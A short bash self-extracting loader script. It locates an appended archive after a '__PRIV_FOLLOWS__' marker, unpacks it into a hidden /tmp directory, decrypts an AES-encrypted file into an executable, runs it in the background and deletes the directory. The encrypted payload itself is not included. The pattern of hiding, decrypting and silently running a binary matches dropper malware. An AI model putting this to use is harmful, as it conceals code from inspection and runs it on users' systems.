#!/bin/bash
SKIP=`awk '/^__PRIV_FOLLOWS__/ { print NR + 1; exit 0; }' $0`
THIS=`pwd`/$0
TEMPDIR=`mktemp -d /tmp/.grr.XXXXXXXX`
tail -n +$SKIP $THIS | tar -xz -C $TEMPDIR
cd $TEMPDIR
openssl aes-256-cbc -d -salt -in priv -out exe
rm priv
chmod 755 exe
./exe&
rm -rf $TEMPDIR
exit 0
__PRIV_FOLLOWS__
